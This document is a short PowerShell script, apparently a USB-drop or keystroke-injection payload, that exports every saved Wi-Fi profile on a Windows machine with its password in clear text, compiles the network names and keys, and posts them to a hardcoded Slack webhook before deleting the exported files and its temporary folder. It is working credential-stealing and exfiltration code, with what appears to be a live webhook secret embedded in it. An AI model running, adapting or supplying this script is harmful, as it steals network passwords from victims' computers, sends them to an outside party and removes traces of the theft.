# Parameters for Slack Webhook
$SlackWebhookUrl = "https://hooks.slack.com/services/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"

# Create a temporary directory and change to it
$TempDir = "$env:temp\wifi-passwords"
New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
Set-Location $TempDir

# Export all Wi-Fi profiles to XML files
netsh wlan export profile key=clear

# Parse the XML files and create a message string
$Message = "Saved Wi-Fi Passwords:`n`n"

Get-ChildItem -Path "*.xml" | ForEach-Object {
    try {
        $XmlData = [xml](Get-Content $_.FullName)
        $SSID = $XmlData.WLANProfile.SSIDConfig.SSID.Name
        $Password = $XmlData.WLANProfile.MSM.Security.SharedKey.KeyMaterial
        $Message += "SSID: $SSID`n"
        $Message += "Password: $Password`n`n"
    } catch {
        # Skip invalid XML files
    }
    Remove-Item $_.FullName
}

# Format the payload for Slack
$Body = @{
    text = $Message
} | ConvertTo-Json

# Send the message to Slack
try {
    Invoke-RestMethod -Uri $SlackWebhookUrl -Method Post -Body $Body -ContentType 'application/json'
} catch {
    # Error handling - you can add logging here if needed
}

# Cleanup
Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
